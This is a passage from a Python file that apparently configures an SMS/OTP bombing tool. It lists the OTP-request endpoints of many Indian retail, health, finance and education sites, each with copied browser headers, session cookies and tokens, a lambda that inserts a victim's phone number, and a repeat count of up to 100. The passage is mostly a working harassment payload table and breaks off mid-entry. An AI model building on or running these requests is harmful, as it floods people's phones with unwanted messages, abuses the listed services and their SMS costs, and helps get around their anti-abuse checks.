            "cookie": "_gcl_au=1.1.440185340.1715511785; _ga=GA1.1.1075884316.1715511787; _ga_7YP4PPR9HS=GS1.1.1715511786.1.0.1715511788.58.0.0; user_id_t=15c6486a-e8ea-4a7e-8551-2069ec30fe70; _fbp=fb.1.1715511794344.1331412975",
            "expires": "0",
            "origin": "https://www.beyoung.in",
            "pragma": "no-cache",
            "priority": "u=1, i",
            "referer": "https://www.beyoung.in/",
            "sec-ch-ua": '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
            "visitor": "477701202435772"
        },
        "data": lambda phone: json.dumps({"username": phone, "username_type": "mobile", "service_type": 0, "vid": "477701202435772"}),
        "count": 100
    },
    
    {
        "url": "https://omqkhavcch.execute-api.ap-south-1.amazonaws.com/simplyotplogin/v5/otp",
        "method": "POST",
        "headers": {
            "accept": "*/*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "action": "sendOTP",
            "content-type": "application/json",
            "origin": "https://wrogn.com",
            "priority": "u=1, i",
            "referer": "https://wrogn.com/",
            "sec-ch-ua": '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "cross-site",
            "shop_name": "wrogn-website.myshopify.com",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
        },
        "data": lambda phone: json.dumps({"username": f"+91{phone}", "type": "mobile", "domain": "wrogn.com", "recaptcha_token": ""}),
        "count": 5
    },
    
    {
        "url": "https://app.medkart.in/api/v1/auth/requestOTP?uuid=f9e75a95-e172-4922-b69c-08e1e3be9f1b",
        "method": "POST",
        "headers": {
            "accept": "application/json, text/plain, */*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "app-platform": "web",
            "authorization": "Bearer",
            "content-type": "application/json",
            "device_id": "6641194520998",
            "langcode": "en",
            "origin": "https://www.medkart.in",
            "priority": "u=1, i",
            "referer": "https://www.medkart.in/",
            "sec-ch-ua": '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-site",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
        },
        "data": lambda phone: json.dumps({"mobile_no": phone}),
        "count": 1
    },
    
    {
        "url": "https://auth.mamaearth.in/v1/auth/initiate-signup",
        "method": "POST",
        "headers": {
            "accept": "*/*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "content-type": "application/json;charset=UTF-8",
            "isweb": "true",
            "origin": "https://mamaearth.in",
            "priority": "u=1, i",
            "referer": "https://mamaearth.in/",
            "sec-ch-ua": '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-site",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
        },
        "data": lambda phone: json.dumps({"mobile": phone, "referralCode": ""}),
        "count": 10
    },
    
    {
        "url": "https://www.coverfox.com/otp/send/",
        "method": "POST",
        "headers": {
            "accept": "*/*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "content-type": "application/x-www-form-urlencoded",
            "cookie": "vt_home_visited=Yes; IS_YAHOO_NATIVE=False; landing_page_url=\"https://www.coverfox.com/\"; tracker=6f8b6312ab8e3039ed01a0c5dae0fd73; sessionid=xtymjyfi87nat0xp09g1qx0xrms9cu9l; _ga_M60LBYV2SK=GS1.1.1715591814.1.0.1715591814.0.0.0; _gid=GA1.2.190999011.1715591815; _gat_gtag_UA_236899531_1=1; _dc_gtm_UA-45524191-1=1; _ga=GA1.1.1812460515.1715591815; _ga_L1DCK356RJ=GS1.1.1715591815.1.0.1715591815.0.0.0; AWSALB=6d3J4OZjP7N26858oPfNJvxuA5e3ePcOVmaoC9PO/iRqTj3NW3qhAozavPMDSCULtHgwKjUjMmxQgqjFpUsHnDB9PYDrC8DP9V+EfrFfNsLKVTndTrLIZpCou0zd; _uetsid=8c899110110911efbeba7dac0ce54265; _uetvid=8c8aa560110911ef9e9c35a1a2c7d25c; _fbp=fb.1.1715591818489.212380246",
            "origin": "https://www.coverfox.com",
            "priority": "u=1, i",
            "referer": "https://www.coverfox.com/user-login/",
            "sec-ch-ua": '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
            "x-requested-with": "XMLHttpRequest"
        },
        "data": lambda phone: f"csrfmiddlewaretoken=5YvA2IoBS6KRJrzV93ysh0VRRvT7CagG3DO7TPu5TwZ9161xVWsEsHzL6mYfvnIA&contact={phone}",
        "count": 5
    },
    
    {
        "url": "https://www.woodenstreet.com/index.php?route=account/forgotten_popup",
        "method": "POST",
        "headers": {
            "accept": "*/*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "cookie": "PHPSESSID=g2toohfnh12nevqm9ugvai7vb2; utm_campaign_id=1406; source=Google; skip_mobile=true; _gcl_aw=GCL.1715593865.EAIaIQobChMIs-WXkq2KhgMVeaRmAh3JQgNHEAAYASAAEgKOVPD_BwE; _gcl_au=1.1.645456708.1715593865; _gid=GA1.2.2020750747.1715593866; _gac_UA-62640150-1=1.1715593866.EAIaIQobChMIs-WXkq2KhgMVeaRmAh3JQgNHEAAYASAAEgKOVPD_BwE; _uetsid=515109b0110e11ef924e1f3875a02587; _uetvid=515ae710110e11ef8666217de75f3cf9; _ga=GA1.1.358917175.1715593866; _fbp=fb.1.1715593868299.1718531847; login_modal_shown=yes; G_ENABLED_IDPS=google; _ga_WYJWZGFQ0J=GS1.1.1715593867.1.0.1715593882.45.0.0; modal_shown=yes",
            "origin": "https://www.woodenstreet.com",
            "priority": "u=1, i",
            "referer": "https://www.woodenstreet.com/?utm_source=Google&utm_medium=cpc&utm_campaign=14220867988&cid=EAIaIQobChMIs-WXkq2KhgMVeaRmAh3JQgNHEAAYASAAEgKOVPD_BwE&pl=&kw=wooden%20street&utm_adgroup=125331114403&gad_source=1&gclid=EAIaIQobChMIs-WXkq2KhgMVeaRmAh3JQgNHEAAYASAAEgKOVPD_BwE",
            "sec-ch-ua": '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "token": "",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
            "x-requested-with": "XMLHttpRequest"
        },
        "data": lambda phone: f"token=&firstname=Aartd&telephone={phone}&pincode=110086&city=NORTH+WEST+DELHI&state=DELHI&cxid=NTUxOTE0&email=hdftysdrt%40gmail.com&password=%40Abvdthfuj&pagesource=onload&redirect2=&login=2&userput_otp=",
        "count": 5
    },
    
    {
        "url": "https://gomechanic.app/api/v2/send_otp",
        "method": "POST",
        "headers": {
            "Accept": "*/*",
            "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
            "Authorization": "725ea1b774c3558a8ec01a8405334a6e50e1e822d9549d84b36a1d3bb9478a27",
            "Connection": "keep-alive",
            "Content-Type": "application/json",
            "Origin": "https://gomechanic.in",
            "Referer": "https://gomechanic.in/",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "cross-site",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
            "sec-ch-ua": '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"'
        },
        "data": lambda phone: json.dumps({"number": phone, "source": "website", "random_id": "K6z9b"}),
        "count": 50
    },
    
    {
        "url": "https://homedeliverybackend.mpaani.com/auth/send-otp",
        "method": "POST",
        "headers": {
            "accept": "application/json, text/plain, */*",
            "accept-language": "en",
            "client-code": "vulpix",
            "content-type": "application/json",
            "origin": "https://www.lovelocal.in",
            "priority": "u=1, i",
            "referer": "https://www.lovelocal.in/",
            "sec-ch-ua": '"Chromium";v="124", "Google Chrome";v="124", "Not-A/Brand";v="99"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "cross-site",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
        },
        "data": lambda phone: json.dumps({"phone_number": phone, "role": "CUSTOMER"}),
        "count": 50
    },
    
    {
        "url": "https://www.tyreplex.com/includes/ajax/gfend.php",
        "method": "POST",
        "headers": {
            "Accept": "application/json, text/javascript, */*; q=0.01",
            "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
            "Connection": "keep-alive",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Cookie": "PHPSESSID=t2p0nhdq0lr9urakmratq4nd1o; _gcl_au=1.1.1418022926.1715621870; _gid=GA1.2.1238691204.1715621871; _gat_UA-144475494-1=1; gads=ID=f63744b23745a70c:T=1715621871:RT=1715621871:S=ALNI_MZBf13VT4bNVBfKOHbiZhJ3r9u5yA; gpi=UID=00000e1a8fc4f354:T=1715621871:RT=1715621871:S=ALNI_MYs8bPQMcoLAM5g-TX_h9lYl29HMA; __eoi=ID=8128f50e3278b1a5:T=1715621871:RT=1715621871:S=AA-AfjYrJcEbaBWGnMYqCRZith_o; dyn_cookie=true; v_type_id=3; _ga=GA1.2.110565510.1715621871; utm_source=Direct; firstUTMParamter=Direct#null#null; lastUTMParamter=Direct#null#null; landing_url=https://www.tyreplex.com/login; la_abbr=LOGIN; la_abbr_d=Login Page; la_c=login; la_default_city_id=1630; la_default_pincode=110001; la_default_pincode_display=110001, New Delhi; la_load_more_after_records=8; la_ajax_load_more_records=8; la_match_v_variants=; pv_abbr=LOGIN; pv_abbr_d=Login Page; pv_c=login; pv_default_city_id=1630; pv_default_pincode=110001; pv_default_pincode_display=110001, New Delhi; pv_load_more_after_records=8; pv_ajax_load_more_records=8; pv_match_v_variants=; _fbp=fb.1.1715621882325.2109963301; _ga_K6EJPW0E8D=GS1.1.1715621871.1.1.1715621890.41.0.0; city_id=1630; default_city_id=1630; pincode=110086; manual_city_selected=1",
            "Origin": "https://www.tyreplex.com",
            "Referer": "https://www.tyreplex.com/login",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-origin",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
            "X-Requested-With": "XMLHttpRequest",
            "sec-ch-ua": '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"'
        },
        "data": lambda phone: f"perform_action=sendOTP&mobile_no={phone}&action_type=order_login",
        "count": 1
    },
    
    {
        "url": "https://www.licious.in/api/login/signup",
        "method": "POST",
        "headers": {
            "accept": "*/*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "content-type": "application/json",
            "cookie": "source=website; nxt=eyJjaXBoZXJ0ZXh0IjoiNmtJWEowNHA0VnRLQ3Faa0NudDBOR2R2SVpLWllmV3RSWkVpMW9DUFkxcz0iLCJpdiI6IjI3NmU4MmJiNGViMTYzN2JiNzdlMWE0NWJlODlmNmUyIiwic2FsdCI6ImIxOWQ3N2I3MzdjMDI0ODg1NjI1ZDUwOTVmZjg5M2ZjYzQyOGZjZTFjMGEzYzc0MjRmNmJiNGFjY2Q3MDJhMTAwNzNiNTIyYTU5MGFmNWJkN2ZjNTYxZTIxOGI4MzgzZDk5NTJiNzRjNGM1ZGU0NGY4ZDM3YzhmOWYyYmRmMzBiM2JhYWFlZTY3YjEwY2U3MjM3MGQ0ZThhZTkzMmMxMTlhZTM5ZGI3MzViZGEwMjgwMzY3NzlkYzllMzI0MDljYmNmOWNhYzA1NmVlNjI0NWQ5NDU2ZDIwMWEyOWYwMjNjNDI4MGI0MjBhYjY4YmNkZGY0YzJjYjQ4YmQ1ZGUwMzYwNzQwOTRhNmYxMTI5NWI1ZDU3MDM5ZWQyZmZhMTQ0ZjFmYTBiOGQ1ZTE1OTQ4ZjYxYTA0OWQ5NjllYTc1ZDY5MmU3MWIyMmRlZDhiOGVlMThlYzU0MDY1NmY2ZjE4ODY1MmY5YWQ1OGMxYjFmMjk4MDNlODg2YjZkOWY0OTIwYjUzOGMwOTY5YTM4MGFjMjQzZjMxNGQzYjM1ZTg1MWI3MDRiYTI0MjI4ZDM1YzE4ODE5YTZmYjliYzA4NTkwMWY3MGUxM2ZjMmJkYTk4Njc2ZGI3OWEzNmFjNDc4ZGE1YzdhYTA2MWJlMmFiOTJhNTYxYmU2ZTA5NDQ2MmI5NjQwIiwiaXRlcmF0aW9ucyI6OTk5fQ==; _gid=GA1.2.1985917922.1715943256; _gcl_au=1.1.1244050996.1715943259; _gat=1; _ga_YN0TX18PEE=GS1.1.1715943268.1.0.1715943268.0.0.0; _ga=GA1.1.972140952.1715943256; WZRK_G=fd462bffc0674ad3bdf9f6b7c537c6c7; WZRK_S_445-488-5W5Z=%7B%22p%22%3A1%2C%22s%22%3A1715943284%2C%22t%22%3A1715943283%7D",
            "origin": "https://www.licious.in",
            "priority": "u=1, i",
            "referer": "https://www.licious.in/",
            "sec-ch-ua": '"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "serverside": "false",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
            "x-csrf-token": ""
        },
        "data": lambda phone: json.dumps({"phone": phone, "captcha_token": None}),
        "count": 3
    },
    
    {
        "url": "https://api.gopaysense.com/users/otp",
        "method": "POST",
        "headers": {
            "accept": "*/*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "content-type": "application/json",
            "cookie": "WZRK_G=466bfb3ffeed42af94539ddb75aab1a3; WZRK_S_8RK-99W-485Z=%7B%22p%22%3A1%2C%22s%22%3A1716292040%2C%22t%22%3A1716292041%7D; _ga=GA1.2.470062265.1716292041; _gid=GA1.2.307457907.1716292041; _gat_UA-96384581-2=1; _fbp=fb.1.1716292041396.1682971378; _uetsid=e4457600176711efbd4505b1c7173542; _uetvid=e445bdd0176711efbe4db167d99f3d78; _ga_4S93MBNNX8=GS1.2.1716292043.1.0.1716292052.51.0.0; _ga_F7R96SWGCB=GS1.1.1716292040.1.1.1716292052.0.0.0",
            "origin": "https://www.gopaysense.com",
            "priority": "u=1, i",
            "referer": "https://www.gopaysense.com/",
            "sec-ch-ua": '"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-site",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
        },
        "data": lambda phone: json.dumps({"phone": phone}),
        "count": 10
    },
    
    {
        "url": "https://apinew.moglix.com/nodeApi/v1/login/sendOTP",
        "method": "POST",
        "headers": {
            "accept": "application/json, text/plain, */*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "access-control-allow-methods": "GET, POST, PUT, DELETE",
            "content-type": "application/json",
            "cookie": "AMCVS_1CEE09F45D761AFF0A495E2D%40AdobeOrg=1; AMCV_1CEE09F45D761AFF0A495E2D%40AdobeOrg=179643557%7CMCIDTS%7C19865%7CMCMID%7C58822726746254564151447357050729602323%7CMCAAMLH-1716898290%7C12%7CMCAAMB-1716898290%7CRKhpRz8krg2tLO6pguXWp5olkAcUniQYPHaMWWgdJ3xzPWQmdj0y%7CMCOPTOUT-1716300690s%7CNONE%7CvVersion%7C5.5.0; s_cc=true; user_sid=s%3ATQ0qv4hLT153wuEftXkOFpeoaD4f3RcC.Pf2awi603%2BgCd0vFyqddzywhbtBrgq77GVj9pyt7DLA; _gcl_aw=GCL.1716293504.EAIaIQobChMIqN7yuduehgMVXCSDAx3VPw8_EAAYASAAEgLhQPD_BwE; AMP_TOKEN=%24NOT_FOUND; _gid=GA1.2.1283593062.1716293508; _gat_UA-65947081-1=1; _ga_V1GYNRLK0T=GS1.1.1716293509.1.0.1716293509.60.0.0; _fbp=fb.1.1716293510686.1114094958; _ga=GA1.2.1383706961.1716293508; _gac_UA-65947081-1=1.1716293517.EAIaIQobChMIqN7yuduehgMVXCSDAx3VPw8_EAAYASAAEgLhQPD_BwE; _gcl_au=1.1.1857621863.1716293504.492344148.1716293509.1716293517; gpv_V9=moglix%3Asignup%20form; s_nr=1716293519104-New; s_sq=%5B%5BB%5D%5D",
            "origin": "https://www.moglix.com",
            "priority": "u=1, i",
            "sec-ch-ua": '"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-site",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
        },
        "data": lambda phone: json.dumps({"email": "", "phone": phone, "type": "p", "source": "signup", "buildVersion": "DESKTOP-7.3", "device": "desktop"}),
        "count": 7
    },
    
    {
        "url": "https://oxygendigitalshop.com/graphql",
        "method": "POST",
        "headers": {
            "accept": "*/*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "content-type": "application/json",
            "cookie": "PHPSESSID=kpqtnpvmdp4k43tcgdopos8e88; _gcl_au=1.1.309357057.1716293827; _clck=1gmll5w%7C2%7Cfly%7C0%7C1602; _ga=GA1.2.1318673831.1716293828; _gid=GA1.2.1588528699.1716293829; _gat_UA-179241331-1=1; _fbp=fb.1.1716293829956.1718674954; private_content_version=09b3c0c64a967be3c44ffa5b45edc234; _ga_M4N3E3FN0Z=GS1.1.1716293827.1.1.1716293856.31.0.0; _clsk=c5rolk%7C1716293857454%7C4%7C1%7Ci.clarity.ms%2Fcollect",
            "origin": "https://oxygendigitalshop.com",
            "priority": "u=1, i",
            "referer": "https://oxygendigitalshop.com/my-account",
            "sec-ch-ua": '"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
        },
        "data": lambda phone: json.dumps({"operationName": "sendRegistrationOtp", "variables": {"email_or_otp": f"+91{phone}", "isResend": False, "token": "03AFcWeA47pl14PFJtz3PaIyTLlRVG0gBdqirpf5kuLCM3Ue63bo30D5xtt3OngezeoBlB3kVH6x8AtyIRK-K6_WOXHx4W4bGNY4803bh8kpzibb2hUbjPTE780Kr1Gh7fVuZvTtsS-osUhhLAWsc3H8Fp3JFnFQi3u4gtZ_ARIQtzAUWp9p8Qt4nDsrM2fwtX9uC0SYz78n1EEXoIstjuEedvgPGsC7xqnwWBwySpW2tAGvVYIQzk6uloXuCUM9CLogsdYPt5_8G437Em9CO-I1SmQCyniCF0UDzfYGUl8pzIBSbWLzZdj4DvFkVHOHytFd6UvjqjTyuoT2RQI-KKXI9wJDGXwtbQOakjRLKE-SymDCD0k6GPQvjNJcbqhk-NMVckwSHLP3muLKQRI9EBKB4t3IjTCHoVyPMF0eLg4J5raYeukU0b0rwoOCoDs7_5uyLCc8qzIBh6LHywWirQJ-m1HvNyfsOvBX-d8_bWT7MIPKFflQfd_DnZKDyrFrRRMVQKiXeSVIRhEAZDIJul5f7Ns-t5isfYOU8-dcANSC1VJeMSPZBkXtKKvSXXYM9vtc7V59nhPyv7LU5v_wpZ2KwOHj7dybDeVr2ELZARDI1tc_NMxZy9HMrLuGhscKa1kSy29v0tpBqtU-l7vIB-1qLT-G3kxHJE4fdv9TL973FPzbEpz03wusN5YomS0hv31VhRPr-qDHBzmj-O1gyPxlEhPkNSPuiPwg"}, "query": "mutation sendRegistrationOtp($token: String!, $email_or_otp: String!, $isResend: Boolean!) {\n  sendRegistrationOtp(token: $token, value: $email_or_otp, is_resend: $isResend)\n}\n"}),
        "count": 7
    },
    
    {
        "url": "https://prod-auth-api.upgrad.com/apis/auth/v5/registration/phone",
        "method": "POST",
        "headers": {
            "accept": "application/json, text/plain, */*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "client": "web",
            "content-type": "application/json",
            "course": "general-interest",
            "origin": "https://www.upgrad.com",
            "priority": "u=1, i",
            "referer": "https://www.upgrad.com/",
            "referrer": "https://www.google.com/",
            "sec-ch-ua": '"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-site",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
            "utm_campaign": "IND_ACQ_WEB_Google_BSearch_All_All_All_Brand_ROI",
            "utm_content": "Brand_Longtail",
            "utm_medium": "BSearch",
            "utm_source": "Google",
            "utm_term": "upgrad online education"
        },
        "data": lambda phone: json.dumps({"phoneNumber": f"+91{phone}"}),
        "count": 10
    },
    
    {
        "url": "http://www.pinknblu.com/v1/auth/generate/otp",
        "method": "POST",
        "headers": {
            "Accept": "application/json, text/javascript, */*; q=0.01",
            "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
            "Connection": "keep-alive",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Cookie": "laravel_session=eyJpdiI6IlBkMkhkZnN3NWpmSE9vQ3Q2VUlyTXc9PSIsInZhbHVlIjoiWHZQTE1HYmhyUTljcWk1NVhyN3hUUkZvYituYzVHclA5NHZ4RHlvaEJNcnNIdENIUmJ6RVNnbjU2bEh5YUE4VVExRzZnRjArK01ZWm4yRmFmZGtobXY0aUw2ZEVaVk1takZKSSt1OW8wcGt6NmZKT1hcL3FlaTd1WjhaemNKXC9tQSIsIm1hYyI6ImRiNTViNjJhZjRjNTE4MWFjMTE4OGYxNWU3M2ExZTAyM2Q3OGVhYTY1NjVhNGY0ZWI3MDQ5YmVjM2M1MGNiYTAifQ%3D%3D; _ga=GA1.1.173966415.1716892374; _gcl_au=1.1.1212519590.1716892374; _fbp=fb.1.1716892385789.994456642; _ga_S6S2RJNH92=GS1.1.1716892373.1.1.1716892425.0.0.0; _ga_8B7LH5VE3Z=GS1.1.1716892374.1.1.1716892425.0.0.0",
            "Origin": "http://www.pinknblu.com",
            "Referer": "http://www.pinknblu.com/",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
            "X-Requested-With": "XMLHttpRequest"
        },
        "data": lambda phone: f"_token=HvvCsMqCY6poDB4GYPd2DJxewZ6H6TWPMHt8hfEV&country_code=%2B91&phone={phone}",
        "count": 50
    },
    
    {
        "url": "https://auth.udaan.com/api/otp/send?client_id=udaan-v2",
        "method": "POST",
        "headers": {
            "accept": "*/*",
            "accept-language": "en-IN",
            "content-type": "application/x-www-form-urlencoded;charset=UTF-8",
            "cookie": "_gid=GA1.2.390459560.1717491496; sid=OF6ijMUYe94BAJPF2m5KGXveYuKyBSVwv+8eUiBFoetQsOwBEf29e+ZR5RacCERPDWwsGifGpzmIdknNx7TaCkm4; mp_a67dbaed1119f2fb093820c9a14a2bcc_mixpanel=%7B%22distinct_id%22%3A%20%22%24device%3A18fa628beb42fc6-0b4da1b51d2b74-26001c51-100200-18fa628beb42fc6%22%2C%22%24device_id%22%3A%20%2218fa628beb42fc6-0b4da1b51d2b74-26001c51-100200-18fa628beb42fc6%22%2C%22%24search_engine%22%3A%20%22google%22%2C%22%24initial_referrer%22%3A%20%22https%3A%2F%2Fwww.google.com%2F%22%2C%22%24initial_referring_domain%22%3A%20%22www.google.com%22%2C%22mps%22%3A%20%7B%7D%2C%22mpso%22%3A%20%7B%22%24initial_referrer%22%3A%20%22https%3A%2F%2Fwww.google.com%2F%22%2C%22%24initial_referring_domain%22%3A%20%22www.google.com%22%7D%2C%22mpus%22%3A%20%7B%7D%2C%22mpa%22%3A%20%7B%7D%2C%22mpu%22%3A%20%7B%7D%2C%22mpr%22%3A%20%5B%5D%2C%22__mpap%22%3A%20%5B%5D%7D; _gat_gtag_UA_180706540_1=1; WZRK_S_8R9-67W-W75Z=%7B%22p%22%3A1%7D; _ga_VDVX6P049R=GS1.1.1717491507.1.0.1717491507.0.0.0; _ga=GA1.1.393162471.1716479639",
            "origin": "https://auth.udaan.com",
            "priority": "u=1, i",
            "referer": "https://auth.udaan.com/login/v2/mobile?cid=udaan-v2&cb=https%3A%2F%2Fudaan.com%2F_login%2Fcb&v=2",
            "sec-ch-ua": '"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "traceparent": "00-db9fd114c85d50d740faf1697fafe008-10128c0be7778059-00",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
            "x-app-id": "udaan-auth"
        },
        "data": lambda phone: f"mobile={phone}",
        "count": 3
    },
    
    {
        "url": "https://xylem-api.penpencil.co/v1/users/register/64254d66be2a390018e6d348",
        "method": "POST",
        "headers": {
            "sec-ch-ua": '"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
            "sec-ch-ua-mobile": "?0",
            "client-version": "300",
            "Authorization": "Bearer",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
            "Content-Type": "application/json",
            "Accept": "application/json, text/plain, */*",
            "Referer": "https://www.xylem.live/",
            "randomId": "bfc4e54e-1873-48cc-823e-40d401d9dbb4",
            "client-id": "64254d66be2a390018e6d348",
            "client-type": "WEB",
            "sec-ch-ua-platform": '"Windows"'
        },
        "data": lambda phone: json.dumps({"mobile": phone, "countryCode": "+91", "firstName": "Anant Ambani"}),
        "count": 50
    },
    
    {
        "url": "https://www.nobroker.in/api/v1/account/user/otp/send?otpM=true",
        "method": "POST",
        "headers": {
            "accept": "*/*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "baggage": "sentry-environment=production,sentry-release=02102023,sentry-public_key=826f347c1aa641b6a323678bf8f6290b,sentry-trace_id=5631cb3b0d6c45f7bbe6cad72d259956",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
